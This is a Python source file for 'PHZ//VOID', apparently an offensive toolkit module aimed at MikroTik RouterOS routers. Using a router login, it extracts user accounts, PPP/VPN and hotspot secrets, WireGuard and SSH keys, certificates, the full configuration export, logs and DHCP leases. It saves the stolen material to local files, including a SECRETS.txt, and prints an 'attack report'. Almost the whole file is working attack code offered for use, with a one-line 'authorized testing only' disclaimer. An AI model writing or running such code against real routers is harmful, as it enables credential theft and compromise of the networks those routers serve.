#!/usr/bin/env python3
# PHZ//VOID - Module 6: Data Exfiltration
# Advanced Data Extraction & Exfiltration from MikroTik RouterOS
# VERSION: FINAL 2.0 - PRODUCTION READY

import json
import os
from typing import Dict, List, Optional
from datetime import datetime
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import HackerStyle, Logger
from lib.mikrotik_api import MikrotikAPI


class ExfiltrationModule:
    """
    Data Exfiltration Module for MikroTik RouterOS
    Mengekstrak konfigurasi, kredensial, dan data sensitif
    """

    def __init__(self, api: MikrotikAPI):
        self.api = api
        self.logger = Logger("Exfil")
        self.extracted_data: Dict = {}
        self.target = api.host if hasattr(api, 'host') else api.target

    # ====================== CORE EXTRACTION METHODS ======================

    def extract_system_info(self) -> Dict:
        """Extract basic system information"""
        HackerStyle.info("📊 Extracting system information...")

        info = {
            'identity': self.api.get_identity(),
            'version': self.api.get_version(),
            'uptime': self.api.get_uptime(),
            'board': self.api.get_board_name(),
            'resource': self.api.get_system_resource()
        }

        self.extracted_data['system'] = info
        HackerStyle.success(f"   ✓ Identity: {info['identity']} | Version: {info['version']}")
        return info

    def extract_users_and_secrets(self) -> Dict:
        """Extract users, passwords, and secrets"""
        HackerStyle.info("🔐 Extracting users & credentials...")

        secrets = {
            'users': self.api.get_users(),
            'ppp_secrets': self.api.execute('/ppp/secret/print'),
            'hotspot_users': self.api.execute('/ip/hotspot/user/print'),
            'wireguard_keys': self.api.execute('/interface/wireguard/print')
        }

        self.extracted_data['secrets'] = secrets
        
        # Summary
        user_count = len(secrets.get('users', []))
        ppp_count = len(secrets.get('ppp_secrets', []))
        hotspot_count = len(secrets.get('hotspot_users', []))
        HackerStyle.success(f"   ✓ {user_count} users, {ppp_count} PPP secrets, {hotspot_count} hotspot users")
        return secrets

    def extract_network_config(self) -> Dict:
        """Extract complete network configuration"""
        HackerStyle.info("🌐 Extracting network configuration...")

        network = {
            'ip_addresses': self.api.get_ip_addresses(),
            'interfaces': self.api.get_interfaces(),
            'firewall': self.api.get_firewall_rules(),
            'routes': self.api.execute('/ip/route/print'),
            'arp': self.api.execute('/ip/arp/print'),
            'dhcp_leases': self.api.execute('/ip/dhcp-server/lease/print')
        }

        self.extracted_data['network'] = network
        
        ip_count = len(network.get('ip_addresses', []))
        iface_count = len(network.get('interfaces', []))
        HackerStyle.success(f"   ✓ {iface_count} interfaces, {ip_count} IP addresses")
        return network

    def extract_services(self) -> Dict:
        """Extract services, scheduler, and scripts"""
        HackerStyle.info("⚙️ Extracting services & automation...")

        services = {
            'services': self.api.execute('/ip/service/print'),
            'scheduler': self.api.execute('/system/scheduler/print'),
            'scripts': self.api.execute('/system/script/print'),
            'backups': self.api.execute('/system/backup/print')
        }

        self.extracted_data['services'] = services
        
        svc_count = len(services.get('services', []))
        script_count = len(services.get('scripts', []))
        HackerStyle.success(f"   ✓ {svc_count} services, {script_count} scripts")
        return services

    def extract_logs(self, limit: int = 200) -> List[Dict]:
        """Extract system logs"""
        HackerStyle.info(f"📜 Extracting last {limit} log entries...")
        logs = self.api.execute('/log/print', limit=limit)
        self.extracted_data['logs'] = logs
        HackerStyle.success(f"   ✓ {len(logs)} log entries extracted")
        return logs

    def export_full_config(self) -> str:
        """Export full router configuration"""
        HackerStyle.info("📄 Exporting full configuration...")
        
        response = self.api.execute('/export compact')
        full_config = '\n'.join([
            item.get('', '') for item in response if '' in item
        ])
        
        self.extracted_data['full_config'] = full_config
        HackerStyle.success(f"   ✓ {len(full_config):,} characters exported")
        return full_config

    def extract_ssh_keys(self) -> List[Dict]:
        """Extract SSH keys"""
        HackerStyle.info("🔑 Extracting SSH keys...")
        keys = self.api.execute('/user/ssh-keys/print')
        self.extracted_data['ssh_keys'] = keys
        HackerStyle.success(f"   ✓ {len(keys)} SSH keys found")
        return keys

    def extract_certificates(self) -> List[Dict]:
        """Extract certificates"""
        HackerStyle.info("📜 Extracting certificates...")
        certs = self.api.execute('/certificate/print')
        self.extracted_data['certificates'] = certs
        HackerStyle.success(f"   ✓ {len(certs)} certificates found")
        return certs

    def extract_backup(self, filename: Optional[str] = None) -> bool:
        """Create and extract backup file"""
        HackerStyle.info("💾 Creating backup...")
        
        if not filename:
            filename = f"exfil_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        result = self.api.execute('/system/backup/save', name=filename)
        success = not any('_error' in r for r in result)
        
        if success:
            HackerStyle.success(f"   ✓ Backup created: {filename}.backup")
            self.extracted_data['backup_name'] = filename
        else:
            HackerStyle.error("   ✗ Backup failed")
        
        return success

    def extract_all(self) -> Dict:
        """Extract everything (full exfiltration)"""
        HackerStyle.warning("🚨 Starting FULL DATA EXFILTRATION...")
        HackerStyle.print_separator("─", 60)

        all_data = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target,
            'system': self.extract_system_info(),
            'secrets': self.extract_users_and_secrets(),
            'network': self.extract_network_config(),
            'services': self.extract_services(),
            'logs': self.extract_logs(300),
            'full_config': self.export_full_config(),
            'ssh_keys': self.extract_ssh_keys(),
            'certificates': self.extract_certificates()
        }

        self.extracted_data = all_data
        HackerStyle.print_separator("─", 60)
        HackerStyle.success("✅ Full exfiltration completed!")
        return all_data

    # ====================== SAVE & REPORT ======================

    def save_to_file(self, filename: Optional[str] = None) -> str:
        """Save all extracted data to files"""
        if not filename:
            filename = f"exfil_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        os.makedirs("reports", exist_ok=True)

        # Save as JSON
        json_path = f"reports/{filename}.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(self.extracted_data, f, indent=2, default=str, ensure_ascii=False)
        HackerStyle.success(f"📁 JSON saved: {json_path}")

        # Save full config separately
        if 'full_config' in self.extracted_data and self.extracted_data['full_config']:
            rsc_path = f"reports/{filename}_config.rsc"
            with open(rsc_path, 'w', encoding='utf-8') as f:
                f.write(self.extracted_data['full_config'])
            HackerStyle.success(f"📁 Config saved: {rsc_path}")

        # Save secrets separately
        if 'secrets' in self.extracted_data:
            secrets_path = f"reports/{filename}_SECRETS.txt"
            with open(secrets_path, 'w', encoding='utf-8') as f:
                f.write("="*60 + "\n")
                f.write("PHZ//VOID - EXTRACTED SECRETS\n")
                f.write(f"Target: {self.target}\n")
                f.write(f"Time: {datetime.now().isoformat()}\n")
                f.write("="*60 + "\n\n")
                
                secrets = self.extracted_data['secrets']
                
                # Users
                f.write("[USERS]\n")
                for user in secrets.get('users', []):
                    f.write(f"  {user.get('name', 'N/A')} - {user.get('group', 'N/A')}\n")
                
                # PPP Secrets
                f.write("\n[PPP SECRETS (VPN)]\n")
                for secret in secrets.get('ppp_secrets', []):
                    f.write(f"  {secret}\n")
                
                # Hotspot Users
                f.write("\n[HOTSPOT USERS]\n")
                for user in secrets.get('hotspot_users', []):
                    f.write(f"  {user}\n")
            
            HackerStyle.success(f"📁 Secrets saved: {secrets_path}")

        return json_path

    def generate_report(self) -> str:
        """Generate comprehensive attack report"""
        report_lines = []
        report_lines.append("="*80)
        report_lines.append(f"  PHZ//VOID - EXFILTRATION REPORT")
        report_lines.append(f"  Target     : {self.target}")
        report_lines.append(f"  Time       : {datetime.now().isoformat()}")
        report_lines.append("="*80)
        report_lines.append("")

        # System Info
        if 'system' in self.extracted_data:
            sys_info = self.extracted_data['system']
            report_lines.append("[SYSTEM INFORMATION]")
            report_lines.append(f"  Identity   : {sys_info.get('identity', 'N/A')}")
            report_lines.append(f"  Version    : {sys_info.get('version', 'N/A')}")
            report_lines.append(f"  Uptime     : {sys_info.get('uptime', 'N/A')}")
            report_lines.append(f"  Board      : {sys_info.get('board', 'N/A')}")
            report_lines.append("")

        # Secrets Summary
        if 'secrets' in self.extracted_data:
            secrets = self.extracted_data['secrets']
            report_lines.append("[EXTRACTED CREDENTIALS]")
            report_lines.append(f"  Users found      : {len(secrets.get('users', []))}")
            report_lines.append(f"  PPP/VPN secrets  : {len(secrets.get('ppp_secrets', []))}")
            report_lines.append(f"  Hotspot users    : {len(secrets.get('hotspot_users', []))}")
            
            # Show actual credentials
            for user in secrets.get('users', []):
                report_lines.append(f"    • {user.get('name', 'N/A')} ({user.get('group', 'N/A')})")
            report_lines.append("")

        # Network Summary
        if 'network' in self.extracted_data:
            net = self.extracted_data['network']
            report_lines.append("[NETWORK CONFIGURATION]")
            report_lines.append(f"  Interfaces      : {len(net.get('interfaces', []))}")
            report_lines.append(f"  IP Addresses    : {len(net.get('ip_addresses', []))}")
            report_lines.append(f"  Firewall rules  : {len(net.get('firewall', []))}")
            report_lines.append(f"  Routes          : {len(net.get('routes', []))}")
            report_lines.append("")

        # Services
        if 'services' in self.extracted_data:
            svc = self.extracted_data['services']
            report_lines.append("[SERVICES & AUTOMATION]")
            report_lines.append(f"  Services        : {len(svc.get('services', []))}")
            report_lines.append(f"  Scripts         : {len(svc.get('scripts', []))}")
            report_lines.append(f"  Scheduler       : {len(svc.get('scheduler', []))}")
            report_lines.append("")

        # Files Saved
        report_lines.append("[FILES SAVED]")
        report_lines.append(f"  reports/exfil_{self.target}_*.json")
        report_lines.append(f"  reports/exfil_{self.target}_config.rsc")
        report_lines.append(f"  reports/exfil_{self.target}_SECRETS.txt")
        report_lines.append("")

        report_lines.append("="*80)
        report_lines.append(f"  {HackerStyle.YELLOW}[!] For authorized security testing only{ HackerStyle.RESET}")
        report_lines.append("="*80)

        return '\n'.join(report_lines)

    # ====================== MENU ======================

    def menu(self):
        """Interactive Exfiltration Menu"""
        while True:
            print("\n" + "═" * 70)
            print(f"     {HackerStyle.RED}📁 DATA EXFILTRATION MODULE - {self.target}{HackerStyle.RESET}")
            print("═" * 70)

            print("""
   1. 📊 System Information
   2. 🔐 Users & Secrets (Credentials!)
   3. 🌐 Network Configuration
   4. ⚙️ Services & Scripts
   5. 📜 System Logs
   6. 📄 Export Full Configuration
   7. 🔑 SSH Keys & Certificates
   8. 💾 Create Backup
   9. 🚨 Extract ALL Data
  10. 💾 Save Extracted Data to File
  11. 📋 Generate Attack Report
  12. 🔙 Back to Main Menu""")

            choice = input(f"\n{HackerStyle.CYAN}┌─[PHZ//VOID:EXFIL]\n└─[?] Select: {HackerStyle.RESET}").strip()

            if choice == "1":
                self.extract_system_info()
            elif choice == "2":
                self.extract_users_and_secrets()
            elif choice == "3":
                self.extract_network_config()
            elif choice == "4":
                self.extract_services()
            elif choice == "5":
                limit = int(input("[?] Log limit (default 200): ") or 200)
                self.extract_logs(limit)
            elif choice == "6":
                config = self.export_full_config()
                preview = input("[?] Show preview? (y/n): ").lower()
                if preview == 'y':
                    print("\n" + config[:1500] + ("\n... (truncated)" if len(config) > 1500 else ""))
            elif choice == "7":
                self.extract_ssh_keys()
                self.extract_certificates()
            elif choice == "8":
                self.extract_backup()
            elif choice == "9":
                self.extract_all()
            elif choice == "10":
                self.save_to_file()
            elif choice == "11":
                report = self.generate_report()
                print("\n" + report)
            elif choice == "12":
                break
            else:
                HackerStyle.error("Invalid choice!")

            input(f"\n{HackerStyle.CYAN}[ENTER] to continue...{HackerStyle.RESET}")


# ==================== STANDALONE TEST ====================
if __name__ == "__main__":
    HackerStyle.banner()
    
    print("\n" + "═" * 60)
    print(f"     {HackerStyle.RED}DATA EXFILTRATION MODULE - FINAL VERSION{HackerStyle.RESET}")
    print("═" * 60 + "\n")
    
    target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET).strip()
    port = int(input(HackerStyle.CYAN + "[?] Port (8728/8729): " + HackerStyle.RESET) or 8728)
    use_ssl = port == 8729

    username = input(HackerStyle.CYAN + "[?] Username: " + HackerStyle.RESET).strip() or "admin"
    password = input(HackerStyle.CYAN + "[?] Password: " + HackerStyle.RESET).strip()

    api = MikrotikAPI(target, port=port, use_ssl=use_ssl)

    if api.connect() and api.login(username, password):
        exfil = ExfiltrationModule(api)
        exfil.menu()
        api.disconnect()
    else:
        HackerStyle.error("Failed to connect or login")